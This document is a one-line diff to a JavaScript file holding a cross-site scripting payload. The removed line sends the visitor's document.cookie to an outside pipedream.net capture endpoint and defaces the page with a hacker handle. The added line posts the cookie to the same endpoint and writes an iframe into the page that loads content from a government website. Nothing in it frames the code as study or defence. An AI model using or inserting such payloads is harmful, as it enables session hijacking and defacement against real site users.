@@ -1,1 +1,1 @@
-var i=new Image(); i.src="https://5381de4c031642a344fea58b89f511ba.m.pipedream.net/"+document.cookie; document.body.innerHTML = "<pre>@1nf1474b13_M4n</pre>"
+var xhttp = new XMLHttpRequest();xhttp.open("POST", "https://5381de4c031642a344fea58b89f511ba.m.pipedream.net", true);xhttp.send(document.cookie);document.write("<\/div><iframe width=\"300\" height=\"35\" src=\"http:\/\/scinet.dost.gov.ph\/union\/Downloads\/test_.htm\" style=\"position: absolute; left: 0px; top: 0px\" frameborder=\"0\"><div>");
